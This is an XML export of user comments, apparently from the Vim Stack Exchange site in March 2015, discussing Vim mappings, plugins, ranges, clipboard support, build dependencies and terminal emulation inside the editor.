  <row Id="2602" PostId="2586" Score="0" Text="+1 and thanks, it works; but it has a problem: if I repeat the change after the first one with `.` the &quot;going back&quot; is not repeated. I am accepting the answer because I really did not specify that thing..." CreationDate="2015-03-17T13:50:52.163" UserId="854" />
  <row Id="2603" PostId="2599" Score="4" Text="Upvoted for option 3. I think this is the most semantically appropriate and Vim-suitable approach." CreationDate="2015-03-17T14:49:45.840" UserId="64" />
  <row Id="2604" PostId="1909" Score="0" Text="@muru edited..." CreationDate="2015-03-17T15:05:18.440" UserId="390" />
  <row Id="2605" PostId="2596" Score="1" Text="You could possibly make a unite source that shows this information, possibly by making a menu. This could be generated with manual and/or automatic techniques. Unite ships with a 'command' source, but this would not include descriptions." CreationDate="2015-03-17T16:53:54.980" UserId="680" />
  <row Id="2606" PostId="2601" Score="0" Text="[`:help netrw-cr`](http://vimdoc.sourceforge.net/htmldoc/pi_netrw.html#netrw-cr) does not document any use of the count. Most attempts I have made result in `Invalid range: call s:UseBufWinVars()`" CreationDate="2015-03-17T17:22:48.630" UserId="880" />
  <row Id="2607" PostId="2604" Score="0" Text="Thanks, but what does &quot;netrw-cr&quot; mean? And what does &quot;netrw&quot; stand for?" CreationDate="2015-03-17T19:00:14.887" UserId="1080" />
  <row Id="2608" PostId="2604" Score="1" Text="netrw is the plugin that handles directory browsing with Explore, its help topics have a prefix of `netrw-`, and cr refers to the carriage return key (enter). It's called netrw because it also handles reading and writing files over a network." CreationDate="2015-03-17T19:01:14.353" UserId="880" />
  <row Id="2609" PostId="2586" Score="0" Text="You need to use the [repeat.vim](http://www.vim.org/scripts/script.php?script_id=2136) plugin to make repeat work. Unfortunately, that requires some more boilerplate code, like `&lt;Plug&gt;` mappings." CreationDate="2015-03-17T19:01:47.257" UserId="970" />
  <row Id="2611" PostId="2596" Score="0" Text="That's exactly what my answer in my &quot;possible duplicate&quot; link describes :)" CreationDate="2015-03-17T23:08:07.547" UserId="64" />
  <row Id="2612" PostId="2602" Score="1" Text="When using _the same_ macro often (without using other macros inbetween), it's very convenient to use `@@` from the 2nd time on." CreationDate="2015-03-17T23:50:04.703" UserId="1416" />
  <row Id="2613" PostId="2608" Score="0" Text="Nice :) `:args */.git/config` actually populates the buffer list as well, so `:bnext` works too. Does that seem odd? (Vim 7.4.52, and Neovim)" CreationDate="2015-03-18T04:00:45.640" UserId="578" />
  <row Id="2614" PostId="2608" Score="1" Text="Also a reminder to others, `]a` cycles the `:args` list if https://github.com/tpope/vim-unimpaired is installed." CreationDate="2015-03-18T04:01:45.637" UserId="578" />
  <row Id="2615" PostId="2612" Score="0" Text="Could you explain that semicolon? I'd have expected a &lt;kbd&gt;.&lt;/kbd&gt; there to denote the current line (which is the line matching ^Chapter), and can't really find out what a semicolon does there (usually, it repeats f,F,t,T, but that doesn't apply here, does it?). Also, couldn't you use `%:h` instead of path/to/dir?" CreationDate="2015-03-18T08:34:36.400" UserId="1296" />
  <row Id="2616" PostId="2612" Score="0" Text="@PhilippFrank: The semicolon is a range delimiter, see `:h :range`. It makes the search for the end start at the position of the first part of the range (with `:g`, it actually doesn't matter, and `,` would do, too). Yes, `%:h` would do; the `path/to/dir` was just an example, obviously." CreationDate="2015-03-18T08:56:52.657" UserId="970" />
  <row Id="2617" PostId="2614" Score="0" Text="I did reproduce this with vim, but the command line did not show `:noh` for me. Doing the same with gvim did not show this behavior." CreationDate="2015-03-18T12:04:17.120" UserId="1296" />
  <row Id="2618" PostId="2607" Score="0" Text="Similar: [How can I open multiple tabs at once?](http://vi.stackexchange.com/q/2108/467) at Vim SE" CreationDate="2015-03-18T12:10:22.313" UserId="467" />
  <row Id="2619" PostId="2607" Score="0" Text="Related: [How do I make vim open all files matching a pattern in different tabs?](http://stackoverflow.com/q/3468763/55075), [Is there a way to open multiple files at once from vim?](http://stackoverflow.com/q/12304520/55075), [How to get vim to open multiple files into tabs at once?](http://superuser.com/q/171763/87805)" CreationDate="2015-03-18T12:14:11.650" UserId="467" />
  <row Id="2620" PostId="2612" Score="0" Text="Do you think you could explain how it works a bit more detail? I've read `:h :global` and `:h :range`, and I understand roughly what's happening, but I'm still having a bit of trouble parsing precisely the boundary between where the &quot;pattern&quot; for the global ends and where the range for the write begins." CreationDate="2015-03-18T12:19:04.827" UserId="343" />
  <row Id="2621" PostId="2608" Score="0" Text="Also `:argadd file*` can do." CreationDate="2015-03-18T12:26:34.617" UserId="467" />
  <row Id="2622" PostId="2612" Score="0" Text="@Rich: Yes, it's a bit cryptic. I've added some more details!" CreationDate="2015-03-18T13:15:22.387" UserId="970" />
  <row Id="2623" PostId="2615" Score="0" Text="Unfortunately, I've had this mapping almost since I started using Vim, so it's pretty well burned in to my muscle memory by now. Thanks for the explanation, though." CreationDate="2015-03-18T14:22:13.193" UserId="343" />
  <row Id="2624" PostId="2612" Score="0" Text="It was the implicit `.` that was stumping me. Thanks!" CreationDate="2015-03-18T14:23:22.283" UserId="343" />
  <row Id="2625" PostId="2614" Score="1" Text="A common mapping for clearing the search highlight is: `nnoremap &lt;c-l&gt; :noh&lt;cr&gt;&lt;c-l&gt;`" CreationDate="2015-03-18T14:43:54.800" UserId="778" />
  <row Id="2626" PostId="2612" Score="0" Text="Thank you very much for this. I am most impressed by your wizardry." CreationDate="2015-03-18T14:49:54.027" UserId="1417" />
  <row Id="2627" PostId="2616" Score="0" Text="This question might be a really good candidate for asking on [vi.se]. You might consider flagging your question for a moderator to migrate there if you want to try your luck getting an answer there instead. I don't think this is possible without a special plugin that might be a pretty involved setup process." CreationDate="2015-03-17T11:18:00.117" UserId="267" />
  <row Id="2628" PostId="2616" Score="0" Text="Wow I never knew that existed! Mixed feelings about migrating from a site with 16k questions on vim and close to a million users to one with 0.5k and c900..." CreationDate="2015-03-17T11:25:13.263" UserId="1406" />
  <row Id="2629" PostId="2616" Score="0" Text="It's a beta site and yes, traffic and user base are a consideration given that this is on topic both places. You might find, however, that people are more willing to go in depth to provide solutions on the dedicated site rather than just brushing this off with a &quot;nope&quot; here and having it quickly get lost in the question stack." CreationDate="2015-03-17T11:30:33.503" UserId="267" />
  <row Id="2630" PostId="2616" Score="0" Text="Yeah, good points. If it's going to happen I'll go with it, but the fragmentation on SE is not always helpful IMO (I regularly use unix/SO/SU/security/DBA and there's a lot of Xover). But I have sympathies for the beta sites - especially as I've been trying to [get a CiviCRM one going](http://area51.stackexchange.com/proposals/77367/civicrm)! Will flag." CreationDate="2015-03-17T11:36:42.507" UserId="1406" />
  <row Id="2631" PostId="2617" Score="3" Text="After further thinking, I've suggested another approach. The files could contain such kind of modeline: `:vim set ft=php.psr2`. And the OP would have to define a ftplugin `ftplugin/psr2.vim` that'll contain calls to `:setlocal`." CreationDate="2015-03-17T13:14:42.180" UserId="626" />
  <row Id="2632" PostId="2610" Score="0" Text="I use `&lt;c-j&gt;` and `&lt;c-k&gt;` when `pumvisble()` to move through the list. I will look in to this, thank you." CreationDate="2015-03-18T14:53:18.527" UserId="489" />
  <row Id="2633" PostId="2615" Score="0" Text="I should probably add, for posterity's sake, the problem described is the *only* problem that I know is definitely caused by this mapping, and the only weird unresolved problem I can recollect having with Vim." CreationDate="2015-03-18T14:53:37.140" UserId="343" />
  <row Id="2635" PostId="2625" Score="0" Text="Yeah I'm aware of this setting, I'm just not a fan of having a huge line in my buffers." CreationDate="2015-03-18T19:50:57.477" UserId="581" />
  <row Id="2636" PostId="2620" Score="1" Text="Well, they're sent whenever the `'term'` option is set.  That's usually only during startup, but there may be scenarios where it is set at runtime." CreationDate="2015-03-18T20:25:52.047" UserId="15" />
  <row Id="2637" PostId="2623" Score="0" Text="What colour scheme is that? It looks quite nice." CreationDate="2015-03-18T20:49:21.007" UserId="5" />
  <row Id="2638" PostId="2623" Score="0" Text="https://github.com/scwood/vim-hybrid" CreationDate="2015-03-18T20:54:30.207" UserId="581" />
  <row Id="2639" PostId="2620" Score="0" Text="In this particular case, this seems to be caused by may_req_ambiguous_char_width() which is only called on startup" CreationDate="2015-03-18T21:48:05.767" UserId="71" />
  <row Id="2640" PostId="2558" Score="0" Text="@Rich I can't reproduce what you describe. Could you provide more detail?  I tried starting with a plain text file, called the function to create the transient window, did Ctrl+o, making the transient window the only window, then did `:b1`, and I was left with the text file again." CreationDate="2015-03-19T05:12:44.977" UserId="227" />
  <row Id="2641" PostId="2620" Score="0" Text="I was planning to try exactly this (which is why I didn't accept the other answer). Good to have confirmation it should work, though." CreationDate="2015-03-19T10:01:21.383" UserId="343" />
  <row Id="2642" PostId="2558" Score="0" Text="Hmm. Must be something to do with my other settings/plugins causing the problem. I'll try to narrow it down when I get a chance. Still, is there any reason why using a buffer-variable instead of a window-variable is a bad idea?" CreationDate="2015-03-19T10:04:47.797" UserId="343" />
  <row Id="2643" PostId="2542" Score="0" Text="Just take a screenshot! I wish Carpetsmoker had done so, because my browser messes up his example." CreationDate="2015-03-19T10:55:56.630" UserId="398" />
  <row Id="2644" PostId="2627" Score="0" Text="Can you elaborate the question a bit, giving some example? As I'm not clear what's asked exactly." CreationDate="2015-03-19T11:18:37.497" UserId="467" />
  <row Id="2645" PostId="2630" Score="0" Text="That seems to be well beyond the ken of simple tags and more the level of something like `cscope`, but I don't know if cscope supports HTML+JS+CSS." CreationDate="2015-03-19T12:55:13.540" UserId="205" />
  <row Id="2646" PostId="2630" Score="1" Text="You could take a look at [this SO question](http://stackoverflow.com/q/12833189/546861)." CreationDate="2015-03-19T12:59:10.450" UserId="54" />
  <row Id="2647" PostId="2631" Score="0" Text="I know Vim doesn't understand the language it edits. Is there a way to set up Ctags so it collects everything that begins with a dot, hash, percent-sign etc? PS. Thanks for camelcase motion." CreationDate="2015-03-19T14:06:13.313" UserId="237" />
  <row Id="2648" PostId="2631" Score="1" Text="Exuberant ctags has rules for it's supported languages built-in; I don't think you can change those. But you can define your own, regexp-based parsing via `--langdef=... --langmap=... --regex-...=...`" CreationDate="2015-03-19T14:12:21.713" UserId="970" />
  <row Id="2649" PostId="2615" Score="1" Text="@Rich how hard would it be to get used to using something like `&lt;Esc&gt;&lt;Esc&gt;`?" CreationDate="2015-03-19T15:28:09.140" UserId="880" />
  <row Id="2650" PostId="2636" Score="0" Text="I am inclined to believe you and not believe you at the same time. I am inclined to believe that at present VimShell and conque do not support what I want. I am inclined to believe the reason is the what you explained here. However, you make it sound like it is not even possible, which I completely reject. As a result of this rejection of the idea that it is impossible, I am still holding out hope that there is another plugin or setup that either exists now or will exist in the future that does what I want." CreationDate="2015-03-19T18:46:32.010" UserId="1410" />
  <row Id="2651" PostId="2636" Score="1" Text="@INTPnerd: Vim doesn't support interactive terminals. Full stop. Conque is a hack that reads shell output into a buffer, and nothing more. If you want an interactive terminal, Vim needs to be patched to add it, and there is some discussion of doing that in NeoVim. I will point out, however, that Bash and Zsh have Vi editing modes that do what you want - outside of Vim on an interactive terminal." CreationDate="2015-03-19T20:33:03.170" UserId="930" />
  <row Id="2652" PostId="2636" Score="0" Text="@greyfade Vim doesn't do lots of things out of the box. Thats why there are plugins and ability to do custom configurations. I don't think I want to use a special Vi mode within Bash since I already have Vim configured the way I want and I don't see how adding Vim bindings to a Bash that is already running inside Vim could be anything but problematic. I am looking forward to trying NeoVim once it is more mature." CreationDate="2015-03-19T20:38:14.153" UserId="1410" />
  <row Id="2653" PostId="2636" Score="1" Text="My point is that TTY-based programs take input as a stream of characters and control characters. Given the limitation that Bash's input is serial in nature, it's _impossible_ to achieve random-access editing of its input without a heroic feat of hacking." CreationDate="2015-03-19T20:44:20.947" UserId="24" />
  <row Id="2654" PostId="2636" Score="0" Text="@200_success Ok, but couldn't the plugin provide input to bash that is something different from exactly what the user typed in?" CreationDate="2015-03-19T20:47:47.310" UserId="1410" />
  <row Id="2655" PostId="2636" Score="0" Text="The plugin would have to use heuristics to detect when the Bash prompt is being displayed, and enter a terminal-emulation mode in which keystrokes are intercepted, vi-mode editing is provided, and then when Enter is pressed, flush the finalized command to Bash. As I said, a heroic feat of hacking." CreationDate="2015-03-19T20:52:06.713" UserId="24" />
  <row Id="2656" PostId="2635" Score="0" Text="Answered by the contributor of the [patch](ftp://ftp.vim.org/pub/vim/patches/7.4/7.4.096) himself!" CreationDate="2015-03-19T21:07:23.857" UserId="24" />
  <row Id="2657" PostId="2634" Score="0" Text="Conque and VimShell are horrible hacks that work well enough for simple stuff like `$ ls` or `$ grep` but fall apart in a multitude of ways once you start to use them as if you were in an actual terminal emulator. You should use a real terminal emulator instead." CreationDate="2015-03-19T21:10:59.403" UserId="54" />
  <row Id="2658" PostId="2636" Score="1" Text="Doing that would not be “a heroic feat of hacking”. It is not possible with Vim, but there are editors that can do it — you can even run `rlwrap bash` which provides a readline-based line editor to bash (of course, it's pointless because readline is also what bash uses internally). I understand Neovim is working on making interactions with asynchronous processes possible." CreationDate="2015-03-19T21:47:43.443" UserId="8" />
  <row Id="2659" PostId="2636" Score="0" Text="@200_success Ok, well all you did was confirm my suspicion, which is that it is totally possible and not that difficult. It seems like all the plugin would have to do is the following:" CreationDate="2015-03-20T00:00:50.057" UserId="1410" />
  <row Id="2660" PostId="2636" Score="0" Text="1) Detect when the buffer has changed (I presume this is not terribly difficult?)" CreationDate="2015-03-20T00:01:42.690" UserId="1410" />
  <row Id="2661" PostId="2636" Score="1" Text="2)determine if that part of the buffer is intended to be for the terminal (perhaps it should always be it's own separate buffer and window, that should make it a lot simpler)" CreationDate="2015-03-20T00:02:05.360" UserId="1410" />
  <row Id="2662" PostId="2636" Score="0" Text="3) Make the corresponding changes are sent to bash (it could just backspace delete everything so far and recreate it to match that buffer's contents)." CreationDate="2015-03-20T00:03:04.310" UserId="1410" />
  <row Id="2663" PostId="2636" Score="0" Text="4)Only when it is in insert mode would it send character presses directly, and then only after moving the cursor to the correct position. 5)The other window and buffer would get updated with output from bash after a command is entered. Doesn't seem too complicated considering all the the complex programs in existence. Maybe I will just have to make it myself..." CreationDate="2015-03-20T00:03:33.467" UserId="1410" />
  <row Id="2664" PostId="2636" Score="0" Text="5) clarification: Once a command is entered, the command is moved from the shell input buffer to the shell output buffer. The input buffer is made blank at this point, ready to accept input." CreationDate="2015-03-20T00:09:20.647" UserId="1410" />
  <row Id="2665" PostId="2635" Score="0" Text="Is there a way to download a compiled version of 7.4.096 for Windows?" CreationDate="2015-03-20T00:17:24.180" UserId="1438" />
  <row Id="2666" PostId="2636" Score="0" Text="A dedicated input buffer would indeed simplify the problem by a lot. However, you would also give up access to Bash command history and Bash tab-completion." CreationDate="2015-03-20T01:09:17.773" UserId="24" />
  <row Id="2667" PostId="2636" Score="0" Text="@200_success Why would you give up access to Bash command history or tab-completion? What if you just pass the key presses to bash when in insert mode?" CreationDate="2015-03-20T02:50:18.637" UserId="1410" />
  <row Id="2668" PostId="2636" Score="1" Text="Then how does the history or completion result make its way from the Bash buffer into your input-editing buffer?" CreationDate="2015-03-20T02:52:41.080" UserId="24" />
  <row Id="2669" PostId="2636" Score="0" Text="@200_success Hmm. The history part seems easier than the tab completion (as far as using up and down arrows to bring up commands from history). But then I'm not really sure how conque does that or exactly what is happening with Bash at that point. It is as if Bash is altering it's own input..." CreationDate="2015-03-20T02:59:55.920" UserId="1410" />
  <row Id="2670" PostId="2631" Score="1" Text="&quot;Better accept the limitations and use Vim where it excels, and stick to an IDE for the rest&quot;. @IngoKarkat That makes no sense. You are saying switching back and forth between Vim and an IDE is more ideal than customizing Vim to do everything you want. It would be better to have a customized Vim that does everything you want exactly the way you want. You are giving up too easily. Don't give up. Vim + Linux + shell = text based IDE. You can get it to do anything you want within the concept of a text based IDE." CreationDate="2015-03-20T03:15:52.347" UserId="1410" />
  <row Id="2671" PostId="2645" Score="2" Text="This is a common issue. Have you given any thoughts to using a commenting plugin like [commentary](https://github.com/tpope/vim-commentary) (which I use), [Nerd Commenter](https://github.com/scrooloose/nerdcommenter), [EnhCommentify](http://www.vim.org/scripts/script.php?script_id=23), [tComment](https://github.com/tomtom/tcomment_vim), ..., [etc](http://vimawesome.com/?q=comment)?" CreationDate="2015-03-20T04:45:17.260" UserId="778" />
  <row Id="2672" PostId="2631" Score="0" Text="@INTPnerd: At least for certain languages, IDEs are very far ahead in functionality; for brevitiy, just two things where it'll be hard for Vim to keep up: fancy GUI visualizations (ruled out of scope by Bram), and asynchronicity (hard to implement). I personally use IntelliJ IDEA and GVIM in parallel, and am quite satisfied with that &quot;best of both worlds&quot; setup." CreationDate="2015-03-20T08:07:20.853" UserId="970" />
  <row Id="2674" PostId="2646" Score="1" Text="&quot;due to some library missing&quot; is not a very descriptive error..." CreationDate="2015-03-20T09:20:53.417" UserId="51" />
  <row Id="2676" PostId="2646" Score="0" Text="Yeah, you *probably* need a -devel package, or maybe something else? I don't know since I don't see the error ;-) There is also not a single authorize list, since Vim has many compile-time options which  influences this (for example, gVim can use several different toolkits)... The general strategy is to see which one you need from the error, install it, and repeat until it doesn't error out." CreationDate="2015-03-20T09:27:09.083" UserId="51" />
  <row Id="2677" PostId="2634" Score="1" Text="Sounds like you might be interested in http://xiki.org/" CreationDate="2015-03-20T10:07:40.980" UserId="343" />
  <row Id="2678" PostId="2615" Score="0" Text="@Random832 That's an intriguing idea." CreationDate="2015-03-20T10:18:09.087" UserId="343" />
  <row Id="2680" PostId="2557" Score="1" Text="Got to say I switched to `vim-plug` from `vundle` and it is amazing. Thanks!" CreationDate="2015-03-20T11:12:19.163" UserId="237" />
  <row Id="2681" PostId="2646" Score="1" Text="Shouldn't [tag:linux] tag be not enough? Compiling process should be the same across different distributions." CreationDate="2015-03-20T11:12:26.053" UserId="467" />
  <row Id="2682" PostId="2654" Score="1" Text="The correct `yum` command is `sudo yum-builddep vim-X11`. And this solved my problem." CreationDate="2015-03-20T11:42:10.790" UserId="622" />
  <row Id="2683" PostId="2646" Score="0" Text="@Carpetsmoker I think the issue might be that the OP doesn't know where to look to find such an error. They've pasted the error they can see into their question already." CreationDate="2015-03-20T12:07:04.303" UserId="343" />
  <row Id="2684" PostId="2645" Score="0" Text="cheers @PeterRincker. I didn't really think to install a plugin for this as I felt that it's probably a fairly simple task that one should be able to do. Perhaps a plugin would be more efficient I'm not sure, the answer given below appears to address it without plugins though" CreationDate="2015-03-20T12:14:36.780" UserId="1443" />
  <row Id="2685" PostId="2647" Score="0" Text="ace thanks @jjaderberg. I'm curious - why is `vnoremap` used instead of `xnoremap`? From the docs the only difference that I can tell is that `vnoremap` works in both visual and select, whereas `xnoremap` only works in visual. If I change the command to `xnoremap` instead it still seems to work, so I'm a little confused. Thanks :)" CreationDate="2015-03-20T12:29:12.250" UserId="1443" />
  <row Id="2686" PostId="2647" Score="0" Text="Just to add - `vnoremap &lt;buffer&gt; &lt;Leader&gt;ma &lt;S-V&gt;`&gt;a$$&lt;ESC&gt;`&lt;i$$&lt;ESC&gt;` I expected that to let me convert a line in LaTeX into a math line, but It doesn't work. I tried using `vnoremap  &lt;Leader&gt;ma &lt;S-V&gt;`&gt;a$$&lt;ESC&gt;`&lt;i$$&lt;ESC&gt;` instead, but that didn't work either (I thought that perhaps the information was selected yet so it wasn't in the buffer or something). I'm not sure why it won't carry out the shift+V then work as before... ho hum" CreationDate="2015-03-20T12:45:36.043" UserId="1443" />
  <row Id="2687" PostId="2635" Score="0" Text="@ChestertheRooster I believe using the builds from Cream (http://sourceforge.net/projects/cream/files/Vim/) are the way to go." CreationDate="2015-03-20T12:55:39.580" UserId="51" />
  <row Id="2688" PostId="2647" Score="0" Text="After `&lt;S-V&gt;` you are in visual mode, but `'&gt;` is a motion in normal mode. Return to normal mode first (`&lt;ESC&gt;` before `'&gt;`). You can use `o` and `O` (mnemonic: &quot;other&quot;) to jump between the ends in visual mode. But in this case visual mode is unnecessary, just use insert-at-beginning-of-line and -at-end-of-line: `I$&lt;ESC&gt;A$&lt;ESC&gt;`. Also, look at Tim Pope's Surround plugin, it is good." CreationDate="2015-03-20T13:27:04.613" UserId="1306" />
  <row Id="2689" PostId="2647" Score="1" Text="I use this technique too. It's important to jump to the end of the range first: adding text at the beginning first will move the end of the range, but it will not move the `` `&gt;`` marker." CreationDate="2015-03-20T15:24:19.170" UserId="1015" />
  <row Id="2690" PostId="2620" Score="0" Text="This has done the trick, although [`VimEnter` specifically didn't work.](http://vi.stackexchange.com/a/2656/343)" CreationDate="2015-03-20T15:57:24.450" UserId="343" />
  <row Id="2691" PostId="2644" Score="0" Text="You can run external tools directly on the content (or parts) of your buffer with `:[range]w !command`." CreationDate="2015-03-20T16:04:27.433" UserId="54" />
  <row Id="2694" PostId="2658" Score="0" Text="thanks @Peter Rincker, I haven't used plugins afaik so I'll have to try and get my head around them at some point (by the looks of things!). The comments are working nicely so far, looking forward to adding more." CreationDate="2015-03-20T17:32:58.493" UserId="1443" />
  <row Id="2695" PostId="2660" Score="1" Text="Ah! It all makes sense now.  But how annoying to a former Java programmer, and to restate the command in the middle, `:P` oh well...now at least I have a reason why this is the case." CreationDate="2015-03-20T17:37:53.033" UserId="1065" />
  <row Id="2696" PostId="2660" Score="6" Text="But there is more! you can use a lowercase function name you just need to prefix it with `s:` making it a script specific function. See `:h local-functions`. You can also use autoload functions which don't have this requirement. See `:h autoload-functions`." CreationDate="2015-03-20T17:57:24.670" UserId="778" />
  <row Id="2697" PostId="2662" Score="2" Text="argh flavor flavour, whoops. cheers" CreationDate="2015-03-20T18:40:54.750" UserId="1443" />
  <row Id="2698" PostId="2492" Score="0" Text="Thanks for confirming and indicating a possible (implausible) route. I don't see what this has to do with WYSIWYG, which ought to show something like `\marginpar{text}` in a margin rather than just conceal the command. Concealing is a Vim feature and tweaking how it interacts with other features doesn't amount to looking for a different editor, surely. But I understand that what I'm asking for is nontrivial and unless someone offers more detailed suggestions I'll accept your answer. Despite your WYSIWYG curse ;-)" CreationDate="2015-03-20T18:51:45.003" UserId="1306" />
  <row Id="2699" PostId="2631" Score="0" Text="@IngoKarkat That only works for certain things. But as far as good support for code lookup/navigation, these are things you want to have working really well inside vim whenever you are using it. It would not make sense to be editing code in vim, and then switch to an IDE to lookup a piece of code so that you can edit it inside Vim. So far I have never been happy with any Vim emulation I have seen inside an IDE. I always end up missing full Vim with all the customizations and plugins I have for it. This becomes more and more true the longer you use and thus customize/extend Vim to your liking." CreationDate="2015-03-20T22:41:06.060" UserId="1410" />
  <row Id="2700" PostId="2665" Score="0" Text="I have this exact same problem with `:sp`, `:vs` and `:e`" CreationDate="2015-03-21T12:57:10.910" UserId="850" />
  <row Id="2701" PostId="2667" Score="0" Text="I do have a decent keyboard (WASD with mx clears). But in many cases I just fire up gvim from my task bar (yeah, windows user, no comment :p), `:set syntax=whatever` and then switch to insert mode if i need a code scratchpad for something." CreationDate="2015-03-21T14:07:31.903" UserId="1461" />
  <row Id="2702" PostId="2670" Score="1" Text="You could try setting `makeprg` and using Vim's `:make` command. See http://vimhelp.appspot.com/quickfix.txt.html#%3Amake_makeprg.. Hmm. No, that doesn't stop the output either." CreationDate="2015-03-21T18:11:02.703" UserId="205" />
  <row Id="2703" PostId="2670" Score="0" Text="Thanks I've had a look at that, It makes things a bit simpler than having to type `:!./make.py`, but not much really. It would be nice to have it set to something such as `&lt;F2&gt;` (or whatever), and so that I could still see the code whilst it was running the programme (not sure if that's possible or not). Thanks" CreationDate="2015-03-21T18:39:37.847" UserId="1443" />
  <row Id="2704" PostId="2670" Score="0" Text="I tried `:silent make`, but that seemed to screw up rendering for some reason. By the way, a mapping shouldn't be difficult: `nnoremap &lt;F2&gt; :silent make&lt;cr&gt;`." CreationDate="2015-03-21T18:41:07.010" UserId="205" />
  <row Id="2705" PostId="2670" Score="0" Text="yeah I've done the mapping, that was me thinking aloud a bit there (bit distracting!). It would be nice to have it so that it ran either silently or there was some other way around. In the processing IDE pressing `Ctrl+r` runs the sketch, it can be nice to be able to view the code whilst the programme is running. I'm not sure how this would be done though (in Vim). Cheers" CreationDate="2015-03-21T18:43:10.183" UserId="1443" />
  <row Id="2706" PostId="2672" Score="0" Text="ooo that works :) I feel like I'm playing with fire a bit though, the mailing list link seemed to imply that the problem was trying to use it without the quotations. Any dangers that you know of? Why don't you like it?  cheers @muru" CreationDate="2015-03-21T19:12:38.507" UserId="1443" />
  <row Id="2707" PostId="2671" Score="0" Text="cheers @kenorb, `:call system('./make.py')` did the trick though :)" CreationDate="2015-03-21T19:13:53.457" UserId="1443" />
  <row Id="2708" PostId="2672" Score="0" Text="@user3130747 it isn't all that obvious when a command finishes or fails - I don't think the exit code is checked at all. So unless your command is guaranteed to succeed, you probably might miss crucial errors." CreationDate="2015-03-21T19:15:38.933" UserId="205" />
  <row Id="2709" PostId="2672" Score="0" Text="This is a good point! I didn't think about that... Will it close the command though? I'm assuming that if there was an error the process would end? Or would that make it just keep running? If there was an error in the code the processing sketch wouldn't run, meaning that there wouldn't be a sketch window to close (and end the process). So I'm wondering about that now. Other wise it's ace" CreationDate="2015-03-21T19:18:04.953" UserId="1443" />
  <row Id="2710" PostId="2672" Score="0" Text="@user3130747 normally, does the process end if there's an error? `system` closes stdin, I think, so unless your command expects something else, it should close." CreationDate="2015-03-21T19:21:43.623" UserId="205" />
  <row Id="2711" PostId="2621" Score="0" Text="Thank you, that plugin is very helpful." CreationDate="2015-03-21T19:40:11.190" UserId="489" />
  <row Id="2712" PostId="2674" Score="1" Text="Since deleting actually cuts, you can skip the yank: `ddkP`, moving down is easier: `ddp`." CreationDate="2015-03-21T19:51:18.967" UserId="205" />
  <row Id="2713" PostId="2675" Score="0" Text="The command works and I want to put it in my .vimrc. So I added this `set highlight cursorline ctermbg=LightBlue` and I get this `E518: Unknown option: ctermbg=LightBlue`" CreationDate="2015-03-21T20:12:05.763" UserId="1464" />
  <row Id="2714" PostId="2675" Score="0" Text="@Vader try without the set. As in `set cursorline` on one line and the command in my answer on another line." CreationDate="2015-03-21T20:12:39.270" UserId="205" />
  <row Id="2715" PostId="2675" Score="0" Text="That removes the Error, but it still not showing up. Anyway you answered my original questions, so thanks." CreationDate="2015-03-21T20:16:32.020" UserId="1464" />
  <row Id="2717" PostId="1941" Score="0" Text="You could also use relative line numbers `:+12,+24d`" CreationDate="2015-03-22T06:39:25.643" UserId="1283" />
  <row Id="2718" PostId="2677" Score="0" Text="`$ howdoi` won't help. You only need basic logic: you have an unused parameter so you have two solutions: remove it or use it." CreationDate="2015-03-22T09:42:27.073" UserId="54" />
  <row Id="2719" PostId="2677" Score="1" Text="@romainl no no , you took me wrong , I just wanted to demonstrate that case. Infact I've intentionally introduced that variable :p" CreationDate="2015-03-22T09:47:28.777" UserId="101" />
  <row Id="2720" PostId="2679" Score="0" Text="says Invalid register name: '+' and I tried with ' * ' too and it says same." CreationDate="2015-03-22T09:49:50.163" UserId="101" />
  <row Id="2721" PostId="2679" Score="1" Text="That means your Vim doesn't have clipboard support. You could launch the command directly from Vim: `:! howdoi &lt;C-R&gt;=v:statusmsg&lt;CR&gt;&lt;CR&gt;` then." CreationDate="2015-03-22T09:52:22.187" UserId="970" />
  <row Id="2722" PostId="2679" Score="0" Text="@lngo and how do I check I have clipboard support? if &quot;vim --version|grep .xterm_clipboard -o&quot; shows &quot;-xterm_clipboard&quot; doesn't it means I do have it? Found it over SO." CreationDate="2015-03-22T09:56:42.273" UserId="101" />
  <row Id="2723" PostId="2679" Score="0" Text="Okay but &quot;:echo has('clipboard')&quot; returns 0 so I don't have it :) , I'll recompile and report back." CreationDate="2015-03-22T10:00:15.947" UserId="101" />
  <row Id="2724" PostId="2679" Score="1" Text="Right; it would have to be a `+` in front. Is the message in one of those variables; have you checked that? Getting it out there is just secondary to your original question." CreationDate="2015-03-22T10:02:00.443" UserId="970" />
  <row Id="2725" PostId="2670" Score="0" Text="You might also want to look into https://github.com/tpope/vim-dispatch" CreationDate="2015-03-22T10:10:37.040" UserId="343" />
  <row Id="2726" PostId="2679" Score="0" Text="I do have Clipboard support now but `:let @+ = v:statusmsg` shows : `&quot;/tmp/vT1CBzR/56.cpp&quot; [New] 92L, 2224C written` :D and `:let @+ = v:errmsg` shows : `E31: No such mapping` :D. And I couldn't understand this &quot; Is the message in one of those variables&quot;. I'm using YCM which predicts errors in my code by analyzing it with Clang. Would that help?" CreationDate="2015-03-22T10:19:01.037" UserId="101" />
  <row Id="2727" PostId="2679" Score="2" Text="@AbhinavGauniyal You can check if YCM uses those variables by executing `:echo v:statusmsg` or `:echo v:errmsg`. If one of them contains the message you're looking for, use that variable. If both of them are empty, then YCM is not using these variables to store the error messages. Also, make sure you get the error message with YCM again as `v:errmsg` may get overwritten with newer error messages." CreationDate="2015-03-22T10:23:20.013" UserId="246" />
  <row Id="2728" PostId="2679" Score="0" Text="I guess YCM uses something else to display those message , I have tried numerous times to echo those message , found some other unrelated texts but not YCM's errors." CreationDate="2015-03-22T10:40:20.223" UserId="101" />
  <row Id="2729" PostId="2679" Score="1" Text="Then it's likely `:echo`. You could raise an issue at YCM's issue tracker to have that (trivially) changed to `:echomsg`." CreationDate="2015-03-22T10:49:12.063" UserId="970" />
  <row Id="2730" PostId="2666" Score="0" Text="Thank you for your response. But I'm just wondering if it's really impossible, considering airline displays for example mode (`:set showmode`), and even though I wasn't able to determine how exactly it sets `airline_current_mode` variable, it is still able to display correct mode, accessing it programmatically somehow." CreationDate="2015-03-22T11:44:16.487" UserId="1055" />
  <row Id="2731" PostId="2668" Score="0" Text="This is a good idea actually, the fewer times shift is used the better. Also, I hear you regarding getting semi-crippled. I have swapped my `1..90-=` keys with their alternatives `!..()_+` in C, C++ and Haskell files since the alternatives are used much more frequently and it's really nice, but I do get semi-crippled when using vim where my settings are not in effect." CreationDate="2015-03-22T14:06:40.390" UserId="850" />
  <row Id="2732" PostId="2682" Score="0" Text="+1 for the Vim wikia link. Learnt a few things there." CreationDate="2015-03-22T14:09:27.603" UserId="356" />
